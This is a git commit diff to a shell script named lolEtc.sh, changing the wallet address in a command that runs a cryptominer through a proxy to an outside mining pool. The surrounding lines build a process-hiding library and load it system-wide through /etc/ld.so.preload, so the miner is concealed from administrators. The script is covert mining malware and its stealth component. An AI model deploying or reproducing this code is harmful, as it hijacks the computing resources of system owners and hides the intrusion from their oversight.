b2c3524fa5561a095b157d795b43b3bfa4889c32
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-03-14 08:55:21 +0700

    Update lolEtc.sh

--- lolEtc.sh
+++ lolEtc.sh
@@ -50,4 +50,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0xc1a48c0ff1d28c85685e3eabd55d19f12327e139.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
